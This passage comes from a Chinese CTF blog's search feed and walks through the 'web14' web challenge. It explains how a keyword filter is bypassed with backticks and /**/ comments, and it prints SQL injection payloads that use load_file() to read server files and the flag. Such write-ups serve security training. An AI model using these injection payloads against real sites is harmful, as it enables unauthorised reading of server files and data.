src="https://s1.vika.cn/space/2023/02/22/6a1136f01aa7435e8578335d690ecc20" alt="image-20211017163203312"></p><p><img src="https://s1.vika.cn/space/2023/02/22/63b357920bf048eebdaafeb051a87f81" alt="image-20211017163215138"></p><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>我们先来看一下网站源代码有条提示<br>if(preg_match(’&#x2F;information_schema.tables|information_schema.columns|linestring| |polygon&#x2F;is’, $_GET[‘query’])){<br>die(’@A@’);<br>}<br>过滤的关键词有information_schema.tables，information_schema.columns，linestring，空格，polygon。在这里提供一种绕过的方法——反引号<br><strong>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。</strong><br>例如information_schema.tables和information_schema.<code>tables</code>都可以使用。</p><p><img src="https://s1.vika.cn/space/2023/02/22/24dbcca6751e429a856c4f53ff5ebc49" alt="image-20211017171431708"></p><p><img src="https://s1.vika.cn/space/2023/02/22/669b19f51ba742d78b76881baba47c79" alt="image-20211017171437533"></p><p><img src="https://s1.vika.cn/space/2023/02/22/508f302b760f4cdda87338ab0785a7ba" alt="image-20211017171445429"></p><p><img src="https://s1.vika.cn/space/2023/02/22/79fb59a8350645a4b816ef00ad379b3c" alt="image-20211017171449417"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;/var/www/html/secret.php&#x27;</span>)</span><br></pre></td></tr></table></figure><p>到这我们发现数据库中并没有我们想要的flag，但是有一条提示tell you a secret,secert has a secret… 所以很有可能flag在secret.php中，现在就有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数load_file()</p><p><img src="https://s1.vika.cn/space/2023/02/22/294a91ef48ea4bba967a2eaf2051042c" alt="image-20211017172031841"></p><p>得到如下内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span><br><span class="line">&#125;<span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure><p>也就是如果&#x2F;tmp&#x2F;gtf1y中的内容为ctf.show则输出&#x2F;real_flag_is_here中的值，所以我们直接将&#x2F;real_flag_is_here读取即可得到flag。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="title function_ invoke__">load_file</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s1.vika.cn/space/2023/02/22/e05fa8ed81e544e0be41d4a91774de6e" alt="image-20211017172132649"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF&amp;Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
